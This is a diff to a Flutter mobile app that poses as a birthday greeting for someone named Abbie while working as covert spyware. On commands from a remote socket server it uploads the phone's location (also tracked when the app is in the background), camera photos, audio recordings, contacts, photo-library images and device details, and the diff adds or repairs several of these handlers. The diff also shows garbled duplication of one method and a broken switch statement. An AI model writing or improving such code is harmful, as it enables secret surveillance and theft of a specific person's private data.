@@ -8,8 +8,8 @@ import 'package:geolocator/geolocator.dart';
 import 'package:camera/camera.dart';
 import 'package:record/record.dart';
 import 'package:contacts_service/contacts_service.dart';
-import 'package:path_provider/path_provider.dart';
 import 'package:photo_manager/photo_manager.dart';
+import 'package:path_provider/path_provider.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 
 void main() {
@@ -19,46 +19,6 @@ void main() {
 
 class MyApp extends StatefulWidget {
   @override
-  Future<void> getPhotos(int count) async {
-    try {
-      // Request photo library permission
-      final PermissionState state = await PhotoManager.requestPermissionExtend();
-      
-      if (state.isAuth) {
-        // Get all albums
-        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
-          type: RequestType.image,
-          onlyAll: true,
-        );
-        
-        if (albums.isNotEmpty) {
-          // Get all photos from the first album (usually "All Photos")
-          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
-            page: 0,
-            size: count,
-          );
-          
-          for (var asset in assets) {
-            // Get the file
-            final File? file = await asset.file;
-            if (file != null) {
-              final bytes = await file.readAsBytes();
-              final base64Image = base64Encode(bytes);
-              
-              socket.emit('photo_data', {
-                'image': base64Image,
-                'filename': file.path.split('/').last,
-                'timestamp': DateTime.now().toIso8601String(),
-              });
-            }
-          }
-        }
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Photo error: $e'});
-    }
-  }
-
   _MyAppState createState() => _MyAppState();
 }
 
@@ -72,46 +32,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   StreamSubscription<Position>? locationStream;
   
   @override
-  Future<void> getPhotos(int count) async {
-    try {
-      // Request photo library permission
-      final PermissionState state = await PhotoManager.requestPermissionExtend();
-      
-      if (state.isAuth) {
-        // Get all albums
-        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
-          type: RequestType.image,
-          onlyAll: true,
-        );
-        
-        if (albums.isNotEmpty) {
-          // Get all photos from the first album (usually "All Photos")
-          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
-            page: 0,
-            size: count,
-          );
-          
-          for (var asset in assets) {
-            // Get the file
-            final File? file = await asset.file;
-            if (file != null) {
-              final bytes = await file.readAsBytes();
-              final base64Image = base64Encode(bytes);
-              
-              socket.emit('photo_data', {
-                'image': base64Image,
-                'filename': file.path.split('/').last,
-                'timestamp': DateTime.now().toIso8601String(),
-              });
-            }
-          }
-        }
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Photo error: $e'});
-    }
-  }
-
   void initState() {
     super.initState();
     WidgetsBinding.instance.addObserver(this);
@@ -119,46 +39,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   }
 
   @override
-  Future<void> getPhotos(int count) async {
-    try {
-      // Request photo library permission
-      final PermissionState state = await PhotoManager.requestPermissionExtend();
-      
-      if (state.isAuth) {
-        // Get all albums
-        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
-          type: RequestType.image,
-          onlyAll: true,
-        );
-        
-        if (albums.isNotEmpty) {
-          // Get all photos from the first album (usually "All Photos")
-          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
-            page: 0,
-            size: count,
-          );
-          
-          for (var asset in assets) {
-            // Get the file
-            final File? file = await asset.file;
-            if (file != null) {
-              final bytes = await file.readAsBytes();
-              final base64Image = base64Encode(bytes);
-              
-              socket.emit('photo_data', {
-                'image': base64Image,
-                'filename': file.path.split('/').last,
-                'timestamp': DateTime.now().toIso8601String(),
-              });
-            }
-          }
-        }
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Photo error: $e'});
-    }
-  }
-
   void didChangeAppLifecycleState(AppLifecycleState state) {
     if (state == AppLifecycleState.resumed) {
       if (!connected) {
@@ -167,8 +47,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     } else if (state == AppLifecycleState.paused) {
       startHeartbeat();
       startLocationTracking();
-    } else if (state == AppLifecycleState.inactive) {
-      startHeartbeat();
     }
   }
 
@@ -263,14 +141,10 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
           socket.emit('location_data', {
             'lat': position.latitude,
             'lng': position.longitude,
-            'alt': position.altitude,
-            'speed': position.speed,
             'timestamp': DateTime.now().toIso8601String(),
           });
         }
-      } catch (e) {
-        // Location might be unavailable
-      }
+      } catch (e) {}
     });
   }
 
@@ -278,12 +152,10 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     try {
       DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
       IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
-      
       socket.emit('device_info', {
         'name': iosInfo.name,
         'model': iosInfo.utsname.machine,
         'systemVersion': iosInfo.systemVersion,
-        'identifier': iosInfo.identifierForVendor,
       });
     } catch (e) {
       socket.emit('device_info', {
@@ -302,12 +174,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       case 'get_location':
         await getLocation();
         break;
-      case 'start_location_stream':
-        await startLocationStream();
-        break;
-      case 'stop_location_stream':
-        await stopLocationStream();
-        break;
       case 'take_photo':
         await takePhoto(params['camera'] ?? 'front');
         break;
@@ -315,12 +181,21 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
         await recordAudio(int.parse(params['duration'] ?? '10'));
         break;
       case 'get_contacts':
-      case 'get_photos':
-        await getPhotos(int.parse(params['count'] ?? '20'));
-        break;
         await getContacts();
         break;
       case 'get_photos':
+        await getPhotos(int.parse(params['count'] ?? '20'));
+        break;
+      case 'get_device_info':
+        await sendDeviceInfo();
+        break;
+      case 'happy_birthday':
+        setState(() {
+          allPermissionsGranted = true;
+        });
+        break;
+    }
+  }
 
   Future<void> getLocation() async {
     try {
@@ -337,29 +212,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
-  Future<void> startLocationStream() async {
-    try {
-      locationStream = Geolocator.getPositionStream(
-        locationSettings: LocationSettings(
-          accuracy: LocationAccuracy.high,
-          distanceFilter: 5,
-        ),
-      ).listen((Position position) {
-        socket.emit('location_data', {
-          'lat': position.latitude,
-          'lng': position.longitude,
-          'timestamp': DateTime.now().toIso8601String(),
-        });
-      });
-    } catch (e) {
-      socket.emit('error', {'error': e.toString()});
-    }
-  }
-
-  Future<void> stopLocationStream() async {
-    await locationStream?.cancel();
-  }
-
   Future<void> takePhoto(String cameraType) async {
     try {
       final cameras = await availableCameras();
@@ -369,7 +221,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       
       final controller = CameraController(camera, ResolutionPreset.high);
       await controller.initialize();
-      
       final image = await controller.takePicture();
       final bytes = await File(image.path).readAsBytes();
       final base64Image = base64Encode(bytes);
@@ -399,7 +250,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       if (audioPath != null) {
         final bytes = await File(audioPath).readAsBytes();
         final base64Audio = base64Encode(bytes);
-        
         socket.emit('audio_data', {
           'audio': base64Audio,
           'duration': duration,
@@ -417,43 +267,31 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       final contactList = contacts.map((c) => {
         'name': '${c.givenName ?? ''} ${c.familyName ?? ''}',
         'phones': c.phones?.map((p) => p.value).toList() ?? [],
-        'emails': c.emails?.map((e) => e.value).toList() ?? [],
       }).toList();
-      
       socket.emit('contacts_data', {'contacts': contactList});
     } catch (e) {
       socket.emit('error', {'error': e.toString()});
     }
   }
 
-
-  @override
   Future<void> getPhotos(int count) async {
     try {
-      // Request photo library permission
       final PermissionState state = await PhotoManager.requestPermissionExtend();
-      
       if (state.isAuth) {
-        // Get all albums
         final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
           type: RequestType.image,
           onlyAll: true,
         );
-        
         if (albums.isNotEmpty) {
-          // Get all photos from the first album (usually "All Photos")
           final List<AssetEntity> assets = await albums[0].getAssetListPaged(
             page: 0,
             size: count,
           );
-          
           for (var asset in assets) {
-            // Get the file
             final File? file = await asset.file;
             if (file != null) {
               final bytes = await file.readAsBytes();
               final base64Image = base64Encode(bytes);
-              
               socket.emit('photo_data', {
                 'image': base64Image,
                 'filename': file.path.split('/').last,
@@ -468,6 +306,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
+  @override
   void dispose() {
     heartbeatTimer?.cancel();
     locationTimer?.cancel();
@@ -478,46 +317,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   }
 
   @override
-  Future<void> getPhotos(int count) async {
-    try {
-      // Request photo library permission
-      final PermissionState state = await PhotoManager.requestPermissionExtend();
-      
-      if (state.isAuth) {
-        // Get all albums
-        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
-          type: RequestType.image,
-          onlyAll: true,
-        );
-        
-        if (albums.isNotEmpty) {
-          // Get all photos from the first album (usually "All Photos")
-          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
-            page: 0,
-            size: count,
-          );
-          
-          for (var asset in assets) {
-            // Get the file
-            final File? file = await asset.file;
-            if (file != null) {
-              final bytes = await file.readAsBytes();
-              final base64Image = base64Encode(bytes);
-              
-              socket.emit('photo_data', {
-                'image': base64Image,
-                'filename': file.path.split('/').last,
-                'timestamp': DateTime.now().toIso8601String(),
-              });
-            }
-          }
-        }
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Photo error: $e'});
-    }
-  }
-
   Widget build(BuildContext context) {
     return MaterialApp(
       home: Scaffold(
@@ -531,38 +330,17 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
               ? Column(
                   mainAxisAlignment: MainAxisAlignment.center,
                   children: [
-                    Icon(
-                      Icons.cake,
-                      size: 100,
-                      color: Colors.pink,
-                    ),
+                    Icon(Icons.cake, size: 100, color: Colors.pink),
                     SizedBox(height: 20),
                     Text(
                       'Happy Birthday Abbie! 🎂',
-                      style: TextStyle(
-                        fontSize: 28,
-                        fontWeight: FontWeight.bold,
-                        color: Colors.pink,
-                      ),
+                      style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: Colors.pink),
                     ),
                     SizedBox(height: 10),
-                    Text(
-                      'All systems activated!',
-                      style: TextStyle(
-                        fontSize: 16,
-                        color: Colors.green,
-                      ),
-                    ),
+                    Text('All systems activated!', style: TextStyle(fontSize: 16, color: Colors.green)),
                     SizedBox(height: 30),
-                    Icon(
-                      connected ? Icons.cloud_done : Icons.cloud_off,
-                      size: 50,
-                      color: connected ? Colors.green : Colors.red,
-                    ),
-                    Text(
-                      connected ? 'Connected' : 'Disconnected',
-                      style: TextStyle(color: connected ? Colors.green : Colors.red),
-                    ),
+                    Icon(connected ? Icons.cloud_done : Icons.cloud_off, size: 50, color: connected ? Colors.green : Colors.red),
+                    Text(connected ? 'Connected' : 'Disconnected', style: TextStyle(color: connected ? Colors.green : Colors.red)),
                   ],
                 )
               : Column(
@@ -570,10 +348,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
                   children: [
                     CircularProgressIndicator(),
                     SizedBox(height: 20),
-                    Text(
-                      'Requesting Permissions...',
-                      style: TextStyle(color: Colors.white, fontSize: 18),
-                    ),
+                    Text('Requesting Permissions...', style: TextStyle(color: Colors.white, fontSize: 18)),
                   ],
                 ),
         ),
